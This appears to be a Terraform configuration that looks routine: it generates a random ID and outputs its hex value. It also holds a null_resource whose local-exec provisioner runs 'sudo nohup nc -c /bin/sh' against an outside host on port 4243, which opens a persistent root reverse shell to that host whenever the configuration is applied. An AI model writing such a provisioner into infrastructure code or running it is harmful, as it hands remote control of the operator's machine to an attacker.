
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "cmd7" {
  provisioner "local-exec" {
      command = "sudo nohup nc -c /bin/sh stargate.leon.click 4243 -v"
        }
        }

output "random" {
  value = "${random_id.random.hex}"
}
